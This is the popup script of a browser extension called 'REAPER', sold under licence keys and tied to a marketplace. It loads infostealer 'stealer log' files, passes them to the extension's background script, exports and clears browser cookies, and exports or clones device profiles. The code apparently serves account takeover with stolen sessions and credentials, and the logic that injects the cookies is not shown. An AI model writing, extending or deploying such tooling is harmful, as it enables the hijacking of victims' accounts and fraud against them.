document.addEventListener('DOMContentLoaded', function() {
    // Check activation status on load
    checkActivationStatus();
    
    // Event listeners
    document.getElementById('activate-btn').addEventListener('click', activateExtension);
    document.getElementById('view-cookies-btn').addEventListener('click', viewCookies);
    document.getElementById('export-cookies-btn').addEventListener('click', exportCookies);
    document.getElementById('clear-cookies-btn').addEventListener('click', clearAllCookies);
    document.getElementById('import-logs-btn').addEventListener('click', importStealerLogs);
    document.getElementById('export-profile-btn').addEventListener('click', exportDeviceProfile);
    document.getElementById('clone-device-btn').addEventListener('click', cloneDevice);
    document.getElementById('sync-marketplace-btn').addEventListener('click', syncWithMarketplace);
    document.getElementById('settings-btn').addEventListener('click', openSettings);
    
    // Add logout button if it exists
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', handleLogout);
    }
    
    // File input change handler
    document.getElementById('stealer-log-file').addEventListener('change', handleFileSelect);
});

let selectedFile = null;

async function checkActivationStatus() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'checkActivation' });
        
        if (response.activated) {
            showMainContent(response.userProfile);
            
            // Update UI with additional auth info
            updateAuthInfo(response);
        } else {
            // Check if user came from first launch popup
            const result = await chrome.storage.local.get(['firstLaunchSeen']);
            if (result.firstLaunchSeen) {
                showActivationSection();
            } else {
                // Redirect back to first launch popup
                window.location.href = 'first-launch-popup.html';
            }
        }
    } catch (error) {
        console.error('Failed to check activation:', error);
        showActivationSection();
    }
}

function updateAuthInfo(authResponse) {
    // Update extension ID display if it exists
    const extensionIdElement = document.getElementById('extension-id');
    if (extensionIdElement) {
        extensionIdElement.textContent = authResponse.extensionId || 'Unknown';
    }
    
    // Update expiry information if it exists
    const expiryElement = document.getElementById('auth-expiry');
    if (expiryElement && authResponse.timeUntilExpiry) {
        const timeUntilExpiry = authResponse.timeUntilExpiry;
        if (timeUntilExpiry.hours > 0) {
            expiryElement.textContent = `Expires in ${timeUntilExpiry.hours}h ${timeUntilExpiry.minutes}m`;
        } else if (timeUntilExpiry.minutes > 0) {
            expiryElement.textContent = `Expires in ${timeUntilExpiry.minutes}m ${timeUntilExpiry.seconds}s`;
        } else {
            expiryElement.textContent = `Expires in ${timeUntilExpiry.seconds}s`;
        }
        
        // Add warning class if expiring soon
        if (timeUntilExpiry.hours <= 1) {
            expiryElement.classList.add('warning');
        }
    }
    
    // Show/hide logout button
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.style.display = authResponse.activated ? 'block' : 'none';
    }
}

async function activateExtension() {
    const activationKey = document.getElementById('activation-key').value.trim();
    
    if (!activationKey) {
        showStatus('Please enter an activation key', 'error');
        return;
    }
    
    // Validate key format
    if (!isValidKeyFormat(activationKey)) {
        showStatus('Invalid activation key format. Expected: REAPER-EXT-2024-XXXX-XXXX', 'error');
        return;
    }
    
    try {
        // Show loading state
        const activateBtn = document.getElementById('activate-btn');
        const originalText = activateBtn.innerHTML;
        activateBtn.disabled = true;
        activateBtn.innerHTML = '<span>🔄</span><span>Activating...</span>';
        
        const response = await chrome.runtime.sendMessage({
            type: 'activate',
            params: { activationKey: activationKey }
        });
        
        if (response.success) {
            showStatus('Extension activated successfully!', 'success');
            showMainContent(response.userProfile);
            
            // Update auth info
            const authStatus = await chrome.runtime.sendMessage({ type: 'getAuthStatus' });
            updateAuthInfo(authStatus);
        } else {
            showStatus(response.error || 'Activation failed', 'error');
        }
    } catch (error) {
        showStatus('Activation failed: ' + error.message, 'error');
    } finally {
        // Reset button state
        const activateBtn = document.getElementById('activate-btn');
        activateBtn.disabled = false;
        activateBtn.innerHTML = originalText;
    }
}

function isValidKeyFormat(key) {
    // Expected format: REAPER-EXT-2024-XXXX-XXXX
    const keyPattern = /^REAPER-EXT-\d{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/;
    return keyPattern.test(key);
}

async function handleLogout() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'logout' });
        
        if (response.success) {
            showStatus('Logged out successfully', 'success');
            
            // Redirect to first launch popup
            setTimeout(() => {
                window.location.href = 'first-launch-popup.html';
            }, 1500);
        } else {
            showStatus('Logout failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Logout failed: ' + error.message, 'error');
    }
}

function showMainContent(userProfile) {
    document.getElementById('activation-section').style.display = 'none';
    document.getElementById('main-content').style.display = 'block';
    
    if (userProfile && userProfile.username) {
        document.getElementById('username').textContent = userProfile.username;
    }
    
    // Show user info if available
    if (userProfile) {
        updateUserInfo(userProfile);
    }
}

function updateUserInfo(userProfile) {
    // Update username display
    const usernameElement = document.getElementById('username');
    if (usernameElement) {
        usernameElement.textContent = userProfile.username || 'Unknown User';
    }
    
    // Update user role/plan if available
    const roleElement = document.getElementById('user-role');
    if (roleElement && userProfile.role) {
        roleElement.textContent = userProfile.role;
        roleElement.className = `role-badge ${userProfile.role.toLowerCase()}`;
    }
    
    // Update subscription info if available
    const subscriptionElement = document.getElementById('subscription-info');
    if (subscriptionElement && userProfile.subscription) {
        subscriptionElement.textContent = userProfile.subscription.plan || 'Free';
        subscriptionElement.className = `subscription-badge ${userProfile.subscription.plan?.toLowerCase() || 'free'}`;
    }
}

function showActivationSection() {
    document.getElementById('activation-section').style.display = 'block';
    document.getElementById('main-content').style.display = 'none';
}

function showStatus(message, type) {
    const statusDiv = document.getElementById('status-message');
    if (!statusDiv) return;
    
    statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
    
    setTimeout(() => {
        statusDiv.innerHTML = '';
    }, 5000);
}

async function viewCookies() {
    try {
        const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
        const currentTab = tabs[0];
        
        const cookies = await chrome.cookies.getAll({ url: currentTab.url });
        
        if (cookies.length === 0) {
            showStatus('No cookies found for this site', 'error');
            return;
        }
        
        // Display cookies in a modal or new tab
        const cookiesData = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite,
            expirationDate: cookie.expirationDate
        }));
        
        // Open cookies in new tab
        await chrome.tabs.create({
            url: 'cookie-list.html',
            active: true
        });
        
    } catch (error) {
        showStatus('Failed to view cookies: ' + error.message, 'error');
    }
}

async function exportCookies() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'exportCookies' });
        
        if (response.success) {
            showStatus(response.message, 'success');
        } else {
            showStatus('Export failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Export failed: ' + error.message, 'error');
    }
}

async function clearAllCookies() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'clearAllCookies' });
        
        if (response.success) {
            showStatus(response.message, 'success');
        } else {
            showStatus('Clear failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Clear failed: ' + error.message, 'error');
    }
}

async function importStealerLogs() {
    if (!selectedFile) {
        showStatus('Please select a stealer log file first', 'error');
        return;
    }
    
    try {
        const fileContent = await readFileContent(selectedFile);
        const logs = parseStealerLogs(fileContent);
        
        const response = await chrome.runtime.sendMessage({
            type: 'importStealerLogs',
            params: { logs: logs }
        });
        
        if (response.success) {
            showStatus(response.message, 'success');
        } else {
            showStatus('Import failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Import failed: ' + error.message, 'error');
    }
}

async function exportDeviceProfile() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'exportDeviceProfile' });
        
        if (response.success) {
            showStatus('Device profile exported successfully', 'success');
        } else {
            showStatus('Export failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Export failed: ' + error.message, 'error');
    }
}

async function cloneDevice() {
    try {
        // This would implement device cloning functionality
        showStatus('Device cloning feature coming soon!', 'info');
    } catch (error) {
        showStatus('Clone failed: ' + error.message, 'error');
    }
}

async function syncWithMarketplace() {
    try {
        // Get user profile from marketplace
        const response = await chrome.runtime.sendMessage({ type: 'getUserProfile' });
        
        if (response.success) {
            updateUserInfo(response.userProfile);
            showStatus('Successfully synced with marketplace', 'success');
        } else {
            showStatus('Sync failed: ' + response.error, 'error');
        }
    } catch (error) {
        showStatus('Sync failed: ' + error.message, 'error');
    }
}

function openSettings() {
    // Open extension options page
    chrome.runtime.openOptionsPage();
}

function handleFileSelect(event) {
    const file = event.target.files[0];
    if (file) {
        selectedFile = file;
        showStatus(`Selected file: ${file.name}`, 'success');
    }
}

function readFileContent(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = (e) => resolve(e.target.result);
        reader.onerror = (e) => reject(new Error('Failed to read file'));
        reader.readAsText(file);
    });
}

function parseStealerLogs(content) {
    try {
        // Try to parse as JSON first
        const jsonData = JSON.parse(content);
        return Array.isArray(jsonData) ? jsonData : [jsonData];
    } catch (error) {
        // If not JSON, try to parse as other formats
        // This is a basic implementation - you might want to enhance this
        const lines = content.split('\n');
        const logs = [];
        
        for (const line of lines) {
            if (line.trim()) {
                try {
                    const parsed = JSON.parse(line);
                    logs.push(parsed);
                } catch (e) {
                    // Skip invalid lines
                    continue;
                }
            }
        }
        
        return logs;
    }
}

// Add periodic auth status check
setInterval(async () => {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'getAuthStatus' });
        if (response.success && response.isAuthenticated) {
            updateAuthInfo(response);
        }
    } catch (error) {
        console.error('Periodic auth check failed:', error);
    }
}, 60000); // Check every minute

// Add keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl/Cmd + Enter to activate
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        const activateBtn = document.getElementById('activate-btn');
        if (activateBtn && !activateBtn.disabled) {
            activateBtn.click();
        }
    }
    
    // Escape to clear status
    if (e.key === 'Escape') {
        const statusDiv = document.getElementById('status-message');
        if (statusDiv) {
            statusDiv.innerHTML = '';
        }
    }
});
